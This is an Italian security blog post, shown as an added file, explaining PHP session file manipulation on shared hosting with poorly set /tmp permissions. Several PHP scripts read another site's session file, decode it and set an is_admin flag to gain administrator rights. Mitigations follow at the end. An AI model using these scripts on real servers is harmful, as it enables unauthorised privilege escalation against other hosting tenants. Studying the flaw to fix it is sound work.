@@ -1,0 +1,128 @@
+Date: 2011-01-26 06:39:39
+Author: evilsocket
+Categories: Exploiting, Hacking, Papers, Web Hacking
+Tags: apache, hack, Hacking, hijacking, id, manipulation, owner, permissions, PHP, session, session_file, session_id, session_path, tmp
+Title: PHP Local Session Manipulation (e configurazione sbagliata dei permessi)
+
+<img class="alignleft" src="http://img236.imageshack.us/img236/9471/hacked11dj5.jpg" alt="" width="300" />In questo articolo illustrerò più o meno brevemente in cosa consiste la tecnica del php session manipulation, cosa comporta in proposito una scorretta configurazione dei permessi su un server e come mitigare il problema.
+
+Prima un po di teoria :)
+
+Le sessioni in php, come alcuni sapranno per certo, sono degli "oggetti" (nella fattispecie array associativi) che vengono creati (su richiesta dell'applicazione php) per ogni utente collegato, oggetti nei quali è possibile salvare delle informazioni di tale utente, come username, user id ecc, senza utilizzare i cookie.
+La differenza fondamentale con i cookie è che, mentre tutte le informazioni di un cookie sono disponibili lato client (quindi l'utente può vederli e/o modificarli tramite il browser) le informazioni di sessione sono salvate lato server e vengono collegate all'utente tramite un id alfa numerico, chiamato session id, che viene impostato tramite cookie.
+L'utente, anche manipolando questo id, non può comunque far nulla poichè le probabilità che indovini un session id valido di un altro utente sono veramente molto esigue.
+
+Ma siamo sicuri che l'unico metodo per aggirare l'ostacolo è manipolare il session id?
+
+<break>La risposta è ovviamente NO :)
+
+Abbiamo detto che queste informazioni sono salvate lato server, ma dove esattamente?
+
+Le sessioni vengono serializzate (trasformate da oggetti complessi a semplici stringhe) e poi salvate in file (di testo), solitamente dentro la cartella /tmp del server, e hanno una nomenclatura del tipo:
+<blockquote>/tmp/sess_&lt;id sessione utente&gt;</blockquote>
+Come ad esempio
+<blockquote>/tmp/sess_b35bded453439521cf59de470f2241ff</blockquote>
+Dove 'b35bded453439521cf59de470f2241ff' è il famoso session id, quindi l'associazione è "un utente -&gt; una sessione -&gt; un file" .
+
+Ma ... qualcuno una volta mi disse che la /tmp è una directory che solitamente è abbastanza facile leggere ... sarà vero?
+
+In parte si ... enumerare i file nella tmp è quasi sempre possibile (a meno che l'admin non sia un paranoico XD), quindi andremo prima a vedere cosa si può fare quando possiamo leggere il nostro file di sessione nella tmp :)
+<h3><span style="font-weight: normal; font-size: 13px;">Dunque dunque dunque ... diciamo che abbiamo il sito http://www.pierino.com/ che ha un bel forum al quale siamo iscritti come normali utenti e, casualmente, abbiamo un sito sullo stesso server di pierino.com, diciamo http://www.foobar.com (o cmq la possibilità di uppare file php su un sito hostato sullo stesso server ... :))</span></h3>
+Il sito pierino.com, ed il suo forum, usano una sessione del tipo:
+<blockquote>$_SESSION['user_id'] = 12345;
+$_SESSION['is_admin'] = false;</blockquote>
+Dove user_id è l'id dell'utente sul db, ed il flag is_admin indica o meno se l'utente è un amministratore, nel nostro caso (per ora), è ovviamente false.
+
+Normalmente non potremmo farci nulla, noi non abbiamo modo ne di leggere questi dati, ne di manipolarli ... a meno che ...
+
+Prima di tutto, occupiamoci di recuperare da pierino.com il nosstro session id, quindi una volta loggati, nella barra dell'url inseriremo il codice:
+<blockquote>javascript:alert(document.cookie)</blockquote>
+Che ci aprirà un alert con i nostri cookie, tra i quali vedremo un bel:
+<blockquote>PHPSESSID=b35bded453439521cf59de470f2241ff</blockquote>
+Ed il primo passo è compiuto, abbiamo il nostro session id! Di conseguenza sappiamo che il nostro file di sessione si trova in /tmp/sess_b35bded453439521cf59de470f2241ff .
+
+Ora, creiamoci un bello script php come segue ed uppiamolo sul nostro sito foobar.com (ricordo, hostato sullo stesso server):
+<blockquote>
+<div id="_mcePaste">&lt;?php</div>
+<div id="_mcePaste" style="padding-left: 30px;">$sid		 = 'b35bded453439521cf59de470f2241ff';</div>
+<div id="_mcePaste" style="padding-left: 30px;">// provo prima percorsi non standard, diversi da /tmp</div>
+<div id="_mcePaste" style="padding-left: 30px;">$sessionfile = session_save_path() . "/sess_".$sid;</div>
+<div id="_mcePaste" style="padding-left: 30px;">$data 		 = @file_get_contents($sessionfile);</div>
+<div id="_mcePaste" style="padding-left: 30px;">if(!$data){</div>
+<div id="_mcePaste" style="padding-left: 60px;">// nel caso vada male, prendo il file nella tmp</div>
+<div id="_mcePaste" style="padding-left: 60px;">$sessionfile = "/tmp/sess_".$sid;</div>
+<div id="_mcePaste" style="padding-left: 60px;">$data 		 = file_get_contents($sessionfile);</div>
+<div id="_mcePaste" style="padding-left: 30px;">}</div>
+<div id="_mcePaste" style="padding-left: 30px;">echo $data;</div>
+<div id="_mcePaste">?&gt;</div></blockquote>
+<div>Richiamandolo dal browser, vedremo il contenuto della nostra sessione sul sito pierino.com!</div>
+<div>Diciamo una cosa del tipo:</div>
+<blockquote>user_id|i:12345;is_admin|b:0;</blockquote>
+E che è sta cosa? Come detto prima, è la nostra sessione serializzata, per vederla deserializzata possiamo usare la funzione <a href="http://php.net/manual/en/function.session-decode.php" target="_blank">session_decode</a> nel modo seguente:
+<blockquote>&lt;?php
+<p style="padding-left: 30px;">$sid<span style="white-space: pre;"> </span> = 'b35bded453439521cf59de470f2241ff';
+// provo prima percorsi non standard, diversi da /tmp
+$sessionfile = session_save_path() . "/sess_".$sid;
+$data <span style="white-space: pre;"> </span> = @file_get_contents($sessionfile);</p>
+<p style="padding-left: 30px;">if(!$data){
+<span style="white-space: pre;"> </span>// nel caso vada male, prendo il file nella tmp
+<span style="white-space: pre;"> </span>$sessionfile = "/tmp/sess_".$sid;
+<span style="white-space: pre;"> </span>$data <span style="white-space: pre;"> </span> = file_get_contents($sessionfile);
+}</p>
+<p style="padding-left: 30px;">// starto la sessione
+session_start();
+// imposto il session id di pierino.com
+session_id($sid);
+// deserializzo la sessione
+session_decode( $data );
+// ne stampo l'array
+print_r($_SESSION);
+?&gt;</p>
+</blockquote>
+Per vedere il risultato:
+<blockquote><span style="font-family: Times; line-height: normal; font-size: small;">Array ( [user_id] =&gt; 12345 [is_admin] =&gt; 0 )</span></blockquote>
+Ed ecco la nostra sessione deserializzata :D
+
+Vogliamo manipolarla ed impostarci come amministratori? Facile :)
+<blockquote>&lt;?php
+<p style="padding-left: 30px;">$sid<span style="white-space: pre;"> </span> = 'b35bded453439521cf59de470f2241ff';
+// provo prima percorsi non standard, diversi da /tmp
+$sessionfile = session_save_path() . "/sess_".$sid;
+$data <span style="white-space: pre;"> </span> = @file_get_contents($sessionfile);</p>
+<p style="padding-left: 30px;">if(!$data){
+<span style="white-space: pre;"> </span>// nel caso vada male, prendo il file nella tmp
+<span style="white-space: pre;"> </span>$sessionfile = "/tmp/sess_".$sid;
+<span style="white-space: pre;"> </span>$data <span style="white-space: pre;"> </span> = file_get_contents($sessionfile);
+}</p>
+<p style="padding-left: 30px;">// starto la sessione
+session_start();
+// imposto il session id di pierino.com
+session_id($sid);
+// deserializzo la sessione
+session_decode( $data );
+<strong>// !!! IMPOSTO IL CAMPO CHE MI INTERESSA !!!</strong>
+<strong>$_SESSION['is_admin'] = true;</strong>
+// ne stampo l'array
+print_r($_SESSION);
+?&gt;</p>
+</blockquote>
+E finalmente, refreshando la pagina del forum di pierino.com, saremo amministratori come per magia :D
+
+Questo perchè avviene?
+
+Per due motivi principali, entrambi riguardano una cattiva configurazione del server:
+<ul>
+	<li>Nella tmp, file di utenti diversi (pierino.com e foobar.com) sono accessibili da entrambi poichè, probabilmente, appartengono allo stesso gruppo (apache, www-data o quel che sia).</li>
+	<li>Il PHP non è impostato per impedire la sovrascrittura delle sessioni.</li>
+</ul>
+Detto questo, e considerando che ci sono MOLTI server di provider anche famosi affetti da questo falla e MOLTE webapp usatissime che non cercano di sistemare la cosa a priori, come si può risolvere il problema? Abbastanza facile .
+<ul>
+	<li>Contattare il proprio provider per avvisarli della cattiva configurazione dei permessi di lettura.</li>
+	<li>Se la nostra webapp ce lo consente (phpbb e smf credo diano la possibilità di farlo), scegliamo di salvare le sessioni su db invece che su file.</li>
+	<li>Nel caso di una webapp scritta da noi, usiamo sessioni criptate in modo tale da renderle difficilmente manipolabili e comprensibili.</li>
+</ul>
+Piccola riflessione finale.
+
+E se il provider in questione, avesse il suo pannello di gestione dei domini (e dei clienti) che funziona tramite sessioni in chiaro in una /tmp aperta? ZAM ZAM ZAAAAAAAAAAM!!!!
+
+Enjoy :)
